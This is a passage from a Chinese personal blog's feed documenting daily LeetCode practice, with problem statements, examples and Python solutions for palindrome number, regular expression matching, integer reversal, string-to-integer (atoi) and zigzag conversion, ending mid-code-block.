    <content type="html"><![CDATA[<p>日常更新冒泡…<a id="more"></a></p><h3 id="9-回文数（简单）"><a href="#9-回文数（简单）" class="headerlink" title="9. 回文数（简单）"></a>9. 回文数（简单）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p><h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: 121</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure></p><h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: -121</span><br><span class="line">输出: false</span><br><span class="line">解释: 从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure></p><h5 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: 10</span><br><span class="line">输出: false</span><br><span class="line">解释: 从右向左读, 为 01 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure></p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：转为字符串处理"><a href="#解法1：转为字符串处理" class="headerlink" title="解法1：转为字符串处理"></a>解法1：转为字符串处理</h5><p>利用python的切片功能一行代码即可解决。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(self, x)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type x: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">return</span> str(x) == str(x)[::<span class="hljs-number">-1</span>]</span><br></pre></td></tr></table></figure></p><h5 id="解法2：不利用字符串"><a href="#解法2：不利用字符串" class="headerlink" title="解法2：不利用字符串"></a>解法2：不利用字符串</h5><p>翻转整个数值，官方题解有说反转一半，以防溢出，但是溢出不就不是回文数了，因此我觉得不需要考虑溢出。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(self, x)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type x: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line">        ans = <span class="hljs-number">0</span></span><br><span class="line">        pri = x</span><br><span class="line">        <span class="hljs-keyword">while</span> x != <span class="hljs-number">0</span>:</span><br><span class="line">            ans = x%<span class="hljs-number">10</span> + ans*<span class="hljs-number">10</span></span><br><span class="line">            x //= <span class="hljs-number">10</span></span><br><span class="line">        <span class="hljs-keyword">if</span> ans == pri:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br></pre></td></tr></table></figure></p><hr><h3 id="10-正则表达式匹配（困难）"><a href="#10-正则表达式匹配（困难）" class="headerlink" title="10. 正则表达式匹配（困难）"></a>10. 正则表达式匹配（困难）</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一个字符串<code>s</code>和一个字符规律<code>p</code>，请你来实现一个支持<code>&#39;.&#39;</code>和<code>&#39;*&#39;</code>的正则表达式匹配。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;.&apos; 匹配任意单个字符</span><br><span class="line">&apos;*&apos; 匹配零个或多个前面的那一个元素</span><br></pre></td></tr></table></figure><br>所谓匹配，是要涵盖整个字符串<code>s</code>的，而不是部分字符串。</p><ul><li><code>s</code>可能为空，且只包含从<code>a-z</code>的小写字母。</li><li><code>p</code>可能为空，且只包含从<code>a-z</code>的小写字母，以及字符<code>.</code>和<code>*</code>。</li></ul><h5 id="示例1-1"><a href="#示例1-1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;aa&quot;</span><br><span class="line">p = &quot;a&quot;</span><br><span class="line">输出: false</span><br><span class="line">解释: &quot;a&quot; 无法匹配 &quot;aa&quot; 整个字符串。</span><br></pre></td></tr></table></figure></p><h5 id="示例2-1"><a href="#示例2-1" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;aa&quot;</span><br><span class="line">p = &quot;a*&quot;</span><br><span class="line">输出: true</span><br><span class="line">解释: 因为 &apos;*&apos; 代表可以匹配零个或多个前面的那一个元素, 在这里前面的元素就是 &apos;a&apos;。因此，字符串 &quot;aa&quot; 可被视为 &apos;a&apos; 重复了一次。</span><br></pre></td></tr></table></figure></p><h5 id="示例3-1"><a href="#示例3-1" class="headerlink" title="示例3:"></a>示例3:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;ab&quot;</span><br><span class="line">p = &quot;.*&quot;</span><br><span class="line">输出: true</span><br><span class="line">解释: &quot;.*&quot; 表示可匹配零个或多个（&apos;*&apos;）任意字符（&apos;.&apos;）。</span><br></pre></td></tr></table></figure></p><h5 id="示例4"><a href="#示例4" class="headerlink" title="示例4:"></a>示例4:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;aab&quot;</span><br><span class="line">p = &quot;c*a*b&quot;</span><br><span class="line">输出: true</span><br><span class="line">解释: 因为 &apos;*&apos; 表示零个或多个，这里 &apos;c&apos; 为 0 个, &apos;a&apos; 被重复一次。因此可以匹配字符串 &quot;aab&quot;。</span><br></pre></td></tr></table></figure></p><h5 id="示例5"><a href="#示例5" class="headerlink" title="示例5:"></a>示例5:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;mississippi&quot;</span><br><span class="line">p = &quot;mis*is*p*.&quot;</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure></p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：暴力递归"><a href="#解法1：暴力递归" class="headerlink" title="解法1：暴力递归"></a>解法1：暴力递归</h5><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isMatch</span><span class="hljs-params">(self, s, p)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type p: str</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> len(p) == <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> s</span><br><span class="line">        <span class="hljs-comment"># 出现'.'的情况</span></span><br><span class="line">        first = bool(s) <span class="hljs-keyword">and</span> p[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> (s[<span class="hljs-number">0</span>], <span class="hljs-string">'.'</span>)</span><br><span class="line">        <span class="hljs-comment"># 出现'*'的情况</span></span><br><span class="line">        <span class="hljs-keyword">if</span> len(p)&gt;<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> p[<span class="hljs-number">1</span>]==<span class="hljs-string">'*'</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> self.isMatch(s, p[<span class="hljs-number">2</span>:]) <span class="hljs-keyword">or</span> (first <span class="hljs-keyword">and</span> self.isMatch(s[<span class="hljs-number">1</span>:], p))</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> first <span class="hljs-keyword">and</span> self.isMatch(s[<span class="hljs-number">1</span>:], p[<span class="hljs-number">1</span>:])</span><br></pre></td></tr></table></figure></p><ul><li>当出现<code>&#39;.&#39;</code>的时候，因为它匹配任意字符，因此只要额外判断<code>p[i]</code>是否等于<code>&#39;.&#39;</code>即可；</li><li>对于出现<code>&#39;*&#39;</code>时，因为它匹配0个到任意个星号前面的字符，所以我们需要对它进行不同的处理，虽然他能匹配0～n个字符，但是对于递归而言，只有两种情况：0个和1个。</li></ul><h5 id="解法2-递归优化"><a href="#解法2-递归优化" class="headerlink" title="解法2: 递归优化"></a>解法2: 递归优化</h5><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isMatch</span><span class="hljs-params">(self, s, p)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type p: str</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-comment"># 定义一个字典作为备忘录</span></span><br><span class="line">        memo = dict()</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dp</span><span class="hljs-params">(i, j)</span>:</span></span><br><span class="line">        <span class="hljs-comment"># 避免重复计算</span></span><br><span class="line">            <span class="hljs-keyword">if</span> (i,j) <span class="hljs-keyword">in</span> memo: <span class="hljs-keyword">return</span> memo[(i,j)] </span><br><span class="line">            <span class="hljs-keyword">if</span> j==len(p): <span class="hljs-keyword">return</span> i==len(s)</span><br><span class="line">            first = i&lt;len(s) <span class="hljs-keyword">and</span> p[j] <span class="hljs-keyword">in</span> (s[i], <span class="hljs-string">'.'</span>)</span><br><span class="line">            <span class="hljs-keyword">if</span> j&lt;len(p)<span class="hljs-number">-1</span> <span class="hljs-keyword">and</span> p[j+<span class="hljs-number">1</span>] == <span class="hljs-string">'*'</span>:</span><br><span class="line">                ans = dp(i,j+<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> first <span class="hljs-keyword">and</span> dp(i+<span class="hljs-number">1</span>,j)</span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                ans = first <span class="hljs-keyword">and</span> dp(i+<span class="hljs-number">1</span>,j+<span class="hljs-number">1</span>)</span><br><span class="line">            memo[(i,j)] = ans</span><br><span class="line">            <span class="hljs-keyword">return</span> ans</span><br><span class="line">        <span class="hljs-keyword">return</span> dp(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)</span><br></pre></td></tr></table></figure><br>使用两个变量<code>i</code>,<code>j</code>记录当前匹配到的位置，从而避免使用子字符串切片，并且将<code>i</code>,<code>j</code>存入备忘录，避免重复计算。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;日常更新冒泡…&lt;/p&gt;
    
    </summary>
    
    
      <category term="LeetCode系列" scheme="https://fansblog.club/categories/LeetCode%E7%B3%BB%E5%88%97/"/>
    
    
  </entry>
  
  <entry>
    <title>LeetCode DAY 5 (7-8)</title>
    <link href="https://fansblog.club/2020/01/14/leetcode-day5/"/>
    <id>https://fansblog.club/2020/01/14/leetcode-day5/</id>
    <published>2020-01-14T10:49:39.000Z</published>
    <updated>2020-01-14T11:09:53.477Z</updated>
    
    <content type="html"><![CDATA[<p>虽然打了一下午的游戏，但懒狗不会忘记刷题的！<a id="more"></a></p><h3 id="7-整数反转（简单）"><a href="#7-整数反转（简单）" class="headerlink" title="7. 整数反转（简单）"></a>7. 整数反转（简单）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>给出一个32位的有符号整数，你需要将这个整数中每位上的数字进行反转。</p><h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: 123</span><br><span class="line">输出: 321</span><br></pre></td></tr></table></figure></p><h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: -123</span><br><span class="line">输出: -321</span><br></pre></td></tr></table></figure></p><h5 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: 120</span><br><span class="line">输出: 21</span><br></pre></td></tr></table></figure></p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：弹出和推入数字-amp-溢出前进行检查"><a href="#解法1：弹出和推入数字-amp-溢出前进行检查" class="headerlink" title="解法1：弹出和推入数字 &amp; 溢出前进行检查"></a>解法1：弹出和推入数字 &amp; 溢出前进行检查</h5><p>取出一位数字很显然用到<code>%</code>，之后需要用<code>//</code>将取出的一位数字从原数值中删去。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse</span><span class="hljs-params">(self, x)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type x: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: int</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        y, ans = abs(x), <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-comment"># 边界</span></span><br><span class="line">        boundry = (<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>) <span class="hljs-keyword">if</span> x&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> (<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>) - <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">while</span> y!=<span class="hljs-number">0</span>:</span><br><span class="line">            ans = ans*<span class="hljs-number">10</span> + y%<span class="hljs-number">10</span></span><br><span class="line">            <span class="hljs-keyword">if</span> ans &gt; boundry:</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span><br><span class="line">            y //= <span class="hljs-number">10</span></span><br><span class="line">        <span class="hljs-keyword">return</span> ans <span class="hljs-keyword">if</span> x&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> -ans</span><br></pre></td></tr></table></figure><br>另外利用移位可以很容易表示一个很大的边界值。</p><h5 id="解法2-转化为字符串"><a href="#解法2-转化为字符串" class="headerlink" title="解法2: 转化为字符串"></a>解法2: 转化为字符串</h5><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse</span><span class="hljs-params">(self, x)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type x: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: int</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-number">-10</span>&lt;x&lt;<span class="hljs-number">10</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> x</span><br><span class="line">        str_x = str(x)</span><br><span class="line">        boundry = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span> <span class="hljs-keyword">if</span> x&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> (<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)<span class="hljs-number">-1</span></span><br><span class="line">        <span class="hljs-keyword">if</span> x&gt;<span class="hljs-number">0</span>:</span><br><span class="line">            temp = str_x[::<span class="hljs-number">-1</span>]</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            temp = str_x[:<span class="hljs-number">0</span>:<span class="hljs-number">-1</span>]</span><br><span class="line">        ans = int(temp)</span><br><span class="line">        <span class="hljs-keyword">if</span> ans&gt;boundry:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> ans <span class="hljs-keyword">if</span> x&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> -ans</span><br></pre></td></tr></table></figure><br>在这里再次提醒自己熟悉一下python字符串的切片功能。</p><hr><h3 id="8-字符串转换整数-atoi-（中等）"><a href="#8-字符串转换整数-atoi-（中等）" class="headerlink" title="8. 字符串转换整数(atoi)（中等）"></a>8. 字符串转换整数(atoi)（中等）</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>请你来实现一个 atoi 函数，使其能将字符串转换成整数。<br>首先，该函数会根据需要丢弃无用的开头空格字符，直到寻找到第一个非空格的字符为止。<br>当我们寻找到的第一个非空字符为正或者负号时，则将该符号与之后面尽可能多的连续数字组合起来，作为该整数的正负号；假如第一个非空字符是数字，则直接将其与之后连续的数字字符组合起来，形成整数。<br>该字符串除了有效的整数部分之后也可能会存在多余的字符，这些字符可以被忽略，它们对于函数不应该造成影响。<br>注意：假如该字符串中的第一个非空格字符不是一个有效整数字符、字符串为空或字符串仅包含空白字符时，则你的函数不需要进行转换。<br>在任何情况下，若函数不能进行有效的转换时，请返回0。</p><h5 id="示例1-1"><a href="#示例1-1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;42&quot;</span><br><span class="line">输出: 42</span><br></pre></td></tr></table></figure></p><h5 id="示例2-1"><a href="#示例2-1" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;   -42&quot;</span><br><span class="line">输出: -42</span><br><span class="line">解释: 第一个非空白字符为 &apos;-&apos;, 它是一个负号。</span><br><span class="line">     我们尽可能将负号与后面所有连续出现的数字组合起来，最后得到 -42 。</span><br></pre></td></tr></table></figure></p><h5 id="示例3-1"><a href="#示例3-1" class="headerlink" title="示例3:"></a>示例3:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;4193 with words&quot;</span><br><span class="line">输出: 4193</span><br><span class="line">解释: 转换截止于数字 &apos;3&apos; ，因为它的下一个字符不为数字。</span><br></pre></td></tr></table></figure></p><h5 id="示例4"><a href="#示例4" class="headerlink" title="示例4:"></a>示例4:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;words and 987&quot;</span><br><span class="line">输出: 0</span><br><span class="line">解释: 第一个非空字符是 &apos;w&apos;, 但它不是数字或正、负号。</span><br><span class="line">     因此无法执行有效的转换。</span><br></pre></td></tr></table></figure></p><h5 id="示例5"><a href="#示例5" class="headerlink" title="示例5:"></a>示例5:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;-91283472332&quot;</span><br><span class="line">输出: -2147483648</span><br><span class="line">解释: 数字 &quot;-91283472332&quot; 超过 32 位有符号整数范围。 </span><br><span class="line">     因此返回 INT_MIN (−231) 。</span><br></pre></td></tr></table></figure></p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>这道题可以利用正则表达式，一行代码就可以解决。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">myAtoi</span><span class="hljs-params">(self, str)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type str: str</span></span><br><span class="line"><span class="hljs-string">        :rtype: int</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">return</span> max(min(int(*re.findall(<span class="hljs-string">r'^[\+\-]?\d+'</span>, str.lstrip())), (<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)<span class="hljs-number">-1</span>), -(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>))</span><br></pre></td></tr></table></figure><br>这里需要注意的是，因为<code>re.findall()</code>返回的是个列表，因此调用<code>int()</code>方法转化为整数的时候需要前面加一个<code>*</code>。<br>这道题也提醒我该去好好看看正则表达式了…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;虽然打了一下午的游戏，但懒狗不会忘记刷题的！&lt;/p&gt;
    
    </summary>
    
    
      <category term="LeetCode系列" scheme="https://fansblog.club/categories/LeetCode%E7%B3%BB%E5%88%97/"/>
    
    
  </entry>
  
  <entry>
    <title>LeetCode DAY 4 (6)</title>
    <link href="https://fansblog.club/2020/01/13/leetcode-day4/"/>
    <id>https://fansblog.club/2020/01/13/leetcode-day4/</id>
    <published>2020-01-13T08:42:27.000Z</published>
    <updated>2020-01-13T09:10:54.155Z</updated>
    
    <content type="html"><![CDATA[<p>嘿！大家好，懒狗又要开始更新Leetcode咯！<a id="more"></a></p><h3 id="6-Z字形变换（中等）"><a href="#6-Z字形变换（中等）" class="headerlink" title="6. Z字形变换（中等）"></a>6. Z字形变换（中等）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>将一个给定字符串根据给定的行数，以从上往下、从左到右进行 Z 字形排列。<br>比如输入字符串为<code>&quot;LEETCODEISHIRING&quot;</code>行数为3时，排列如下：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">L   C   I   R</span><br><span class="line">E T O E S I I G</span><br><span class="line">E   D   H   N</span><br></pre></td></tr></table></figure><br>之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：<code>&quot;LCIRETOESIIGEDHN&quot;</code>。<br>请你实现这个将字符串进行指定行数变换的函数：<br><code>string convert(string s, int numRows);</code></p><h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: s = <span class="hljs-string">"LEETCODEISHIRING"</span>, numRows = 3</span><br><span class="line">输出: <span class="hljs-string">"LCIRETOESIIGEDHN"</span></span><br></pre></td></tr></table></figure></p><h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入: s = <span class="hljs-string">"LEETCODEISHIRING"</span>, numRows = 4</span><br><span class="line">输出: <span class="hljs-string">"LDREOEIIECIHNTSG"</span></span><br><span class="line">解释:</span><br><span class="line"></span><br><span class="line">L     D     R</span><br><span class="line">E   O E   I I</span><br><span class="line">E C   I H   N</span><br><span class="line">T     S     G</span><br></pre></td></tr></table></figure></p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：按行取值（就叫找规律吧…）"><a href="#解法1：按行取值（就叫找规律吧…）" class="headerlink" title="解法1：按行取值（就叫找规律吧…）"></a>解法1：按行取值（就叫找规律吧…）</h5><p>我们可以从这个Z字形（大哥这明明就是N字形啊）的排列上找出些规律，比如如果<code>numRows = 3</code>，那么第一行的两个元素相差的距离为4，也就是<code>d = 2*numRows-2</code>，最后一行亦如此，而从示例2我们可以看出，中间各行的元素间隔虽然不相等，但是只有两种分布，一种比第一行的<code>d</code>要少一部分，而这一部分就是<code>2*距离第一行的行数差</code>，那另一种元素间隔就是<code>d-刚刚那种元素间隔</code>，就这么简单？还真就这么被找规律找出来了hhh，我都想笑了。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 